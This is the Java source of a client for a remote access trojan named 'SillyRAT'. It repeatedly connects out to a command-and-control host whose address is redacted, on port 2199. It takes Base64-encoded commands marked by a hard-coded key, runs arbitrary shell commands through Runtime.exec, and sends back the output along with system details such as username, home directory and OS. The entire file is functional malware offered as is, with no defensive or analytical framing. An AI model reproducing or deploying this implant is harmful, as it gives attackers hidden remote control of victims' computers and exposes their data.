package com.sillyrat;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.Base64;

public class St {
    private static String KEY = ")J@NcRfU";
    private static String ENCODING = System.getProperty("sun.jnu.encoding");
    public static void main(String[] args) throws Exception {
        SocketAddress socketAddress=new InetSocketAddress("xxxxxxxxxx", 2199);
        while (true){
            try{
                Socket sock = new Socket();
                sock.connect(socketAddress);
                sock.setKeepAlive(true);

                while(true){
                    try (InputStream input = sock.getInputStream()) {
                        try (OutputStream output = sock.getOutputStream()) {
                            handle(input, output);
                        }
                    }
                    catch (java.io.EOFException e){
                        continue;
                    }


                }
            }
            catch(java.net.SocketException e) {
                Thread.sleep(3000);
                continue;
            }
            catch (java.io.IOException e){
                continue;
            }

        }


    }
    private static void handle(InputStream input, OutputStream output) throws Exception {

        DataInputStream in = new DataInputStream(input);
        DataOutputStream out = new DataOutputStream(output);
        ArrayList<Byte> ids = new ArrayList<Byte>();

        byte b;
        while (true){
            b=in.readByte();
            ids.add(b);
            StringBuilder s = new StringBuilder(ids.size());
            for(Byte ch: ids) s.append((char)((byte) ch));
            String recvString = s.toString();
            if (recvString.contains(KEY)){
                String command = getCommand(recvString);
                //命令执行
                if (command.split(":")[0].equals("shell")){
                    String result  = execCmd(command.split(":",2)[1]);
                    String base64encodedString = Base64.getEncoder().encodeToString(result.getBytes(ENCODING));
                    out.writeUTF(base64encodedString+KEY);
                    out.flush();
                    ids.clear();
                }
                //获取系统信息
                if (command.split(":")[0].equals("sysinfo")){
                    String base64encodedString = Base64.getEncoder().encodeToString(getSystemInfo().getBytes(ENCODING));
                    out.writeUTF(base64encodedString+KEY);
                    out.flush();
                }
            };
        }
        }
    //该方法使用Runtime.getRuntime().exec进行命令执行
    private static String execCmd(String cmd) throws Exception {
        StringBuilder result = new StringBuilder();

        Process process = null;
        BufferedReader bufrIn = null;
        BufferedReader bufrError = null;

        try {
            // 执行命令, 返回一个子进程对象（命令在子进程中执行）
            process = Runtime.getRuntime().exec(cmd);

            // 方法阻塞, 等待命令执行完成（成功会返回0）
            process.waitFor();

            // 获取命令执行结果, 有两个结果: 正常的输出 和 错误的输出（PS: 子进程的输出就是主进程的输入）
            bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), ENCODING));
            bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), ENCODING));

            // 读取输出
            String line = null;
            while ((line = bufrIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufrError.readLine()) != null) {
                result.append(line).append('\n');
            }

        } finally {
            closeStream(bufrIn);
            closeStream(bufrError);

            // 销毁子进程
            if (process != null) {
                process.destroy();
            }
        }

        // 返回执行结果
        return result.toString();
    }
    private static void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
            }
        }
    }
    //获得要执行的命令,获取的结果是
    // shell:whoami    命令执行
    // sysinfo:         获取系统信息
    // screenshot:      截屏 返回字节

    private static String getCommand(String old){
        String new1 = old.replace(KEY,"");
        byte[] new2 = Base64.getMimeDecoder().decode(new1);
        String new3 = new String(new2);
        return new3;
    };
    private static String getSystemInfo(){
        String encode = System.getProperty("sun.jnu.encoding");
        String home = System.getProperty("java.home");
        String version = System.getProperty("java.version");
        String arch = System.getProperty("os.arch");
        String osname = System.getProperty("os.name");
        String userdir = System.getProperty("user.dir");
        String userhome = System.getProperty("user.home");
        String username = System.getProperty("user.name");
        String result = String.format("ENCODING:%s\nHOME:%s\nVERSION:%s\nARCH:%s\nOSNAME:%s\nUSERDIR:%s\nUSERHOME:%s\nUSERNAME:%s\n",encode,home,version,arch,osname,userdir,userhome,username);
        return result;
    }

}




